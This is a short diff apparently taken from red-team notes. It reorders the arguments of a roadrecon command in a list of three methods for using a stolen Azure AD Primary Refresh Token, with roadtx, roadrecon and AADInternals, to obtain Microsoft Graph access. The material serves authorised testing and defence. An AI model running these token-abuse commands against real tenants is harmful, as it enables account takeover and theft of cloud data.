@@ -72,7 +72,7 @@ roadtx browserprtauth --prt-cookie $prtToken # this will automatically get new a
 
 # method 2:
 $prtToken = Get-AADIntUserPRTToken
-roadrecon auth --prt-cookie $prtToken -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2"
+roadrecon auth -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2" --prt-cookie $prtToken 
 
 # method 3:
 $at = Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken
